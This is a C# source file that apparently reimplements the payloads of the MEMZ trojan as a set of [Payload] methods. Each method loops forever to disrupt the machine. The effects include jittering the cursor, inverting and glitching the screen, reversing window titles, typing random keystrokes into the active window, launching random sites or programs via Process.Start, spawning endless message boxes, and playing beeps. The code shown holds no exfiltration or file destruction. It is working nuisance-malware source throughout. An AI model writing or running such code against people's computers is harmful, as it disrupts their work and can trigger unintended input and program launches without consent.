using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;
using ImageProcessor;
using ScreenLib;

namespace GlitchPayloads
{
    [Payload]
    public static class Memz
    {
        [Payload]
        public static void PayloadCursor()
        {
            while (true)
                try
                {
                    Thread.Sleep(200);
                    Point tmp = Cursor.Position;
                    tmp.X += Common.Rnd.Next(-2, 3);
                    tmp.Y += Common.Rnd.Next(-2, 3);
                    Cursor.Position = tmp;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadInvert()
        {
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    using MemoryStream ms = new MemoryStream();
                    using ImageFactory imageFactory = new ImageFactory();
                    imageFactory.Load(ScreenMan.CaptureScreen())
                        .InvertColor()
                        .Save(ms);
                    ms.Position = 0;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer();
                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), Point.Empty);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadTunnel()
        {
            Rectangle bounds = ScreenMan.GetBounds();
            Size size34 = new Size((bounds.Width / 4) * 3, (bounds.Height / 4) * 3);
            Point point34 = new Point(bounds.Width / 8, bounds.Height / 8);
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    using MemoryStream ms = new MemoryStream();
                    using ImageFactory imageFactory = new ImageFactory();
                    Image tmp = ScreenMan.CaptureScreen();
                    imageFactory.Load(tmp)
                        .Resize(size34)
                        .Save(ms);
                    ms.Position = 0;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), point34);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadReverseText()
        {
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    foreach (Wnd32 wnd in Wnd32.getAll())
                    {
                        string? tmp = wnd.title;
                        if (!string.IsNullOrWhiteSpace(tmp))
                            wnd.title = string.Join("", tmp.ToCharArray().Reverse());
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadKeyboard()
        {
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    SendKeys.SendWait($"{(char) Common.Rnd.Next(48, 123)}");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadSound()
        {
            SystemSound[] sounds = typeof(SystemSounds).GetProperties()
                .Select(s => (SystemSound) s.GetValue(null, null)).ToArray();
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    sounds[Common.Rnd.Next(sounds.Length)].Play();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadExecute()
        {
            string[] sites = Sites.SiteString.Split(new[] {"\n", "\r"}, StringSplitOptions.RemoveEmptyEntries);
            string choice = "";
            while (true)
                try
                {
                    Thread.Sleep(2000);
                    choice = sites[Common.Rnd.Next(sites.Length)];
                    Process.Start(choice);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"{e}\nChoice was: {choice}");
                }
        }

        [Payload]
        public static void PayloadMessageBox()
        {
            while (true)
                try
                {
                    Thread.Sleep(3000);
                    new Thread(() => MessageBox.Show("Still using this computer?", "lol", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning)).Start();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadDrawWarnings()
        {
            Rectangle bounds = ScreenMan.GetBounds();
            Icon icon = SystemIcons.Warning;
            int xMax = bounds.Width - icon.Width;
            int yMax = bounds.Height - icon.Height;
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawIcon(icon, Common.Rnd.Next(xMax + 1), Common.Rnd.Next(yMax + 1));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadDrawErrors()
        {
            Icon icon = SystemIcons.Error;
            Size halfIcon = new Size(icon.Width / 2, icon.Height / 2);
            while (true)
                try
                {
                    Thread.Sleep(100);
                    Point tmp = Cursor.Position;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawIcon(icon, tmp.X - halfIcon.Width, tmp.Y - halfIcon.Height);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadCrazyBus()
        {
            while (true)
                try
                {
                    Beep.BeepBeep(1000, Common.Rnd.Next(1000, 6000), 200);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }

        [Payload]
        public static void PayloadScreenGlitches()
        {
            Rectangle bounds = ScreenMan.GetBounds();
            while (true)
                try
                {
                    Thread.Sleep(1000);
                    Size objSize = new Size(Common.Rnd.Next(100, 500), Common.Rnd.Next(100, 500));
                    int xMax = bounds.Width - objSize.Width;
                    int yMax = bounds.Height - objSize.Height;
                    using MemoryStream ms = new MemoryStream();
                    using ImageFactory imageFactory = new ImageFactory();
                    imageFactory.Load(ScreenMan.CaptureScreen())
                        .Crop(new Rectangle(new Point(Common.Rnd.Next(xMax), Common.Rnd.Next(yMax)), objSize))
                        .Save(ms);
                    ms.Position = 0;
                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms),
                        new Point(Common.Rnd.Next(xMax), Common.Rnd.Next(yMax)));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
        }
    }
}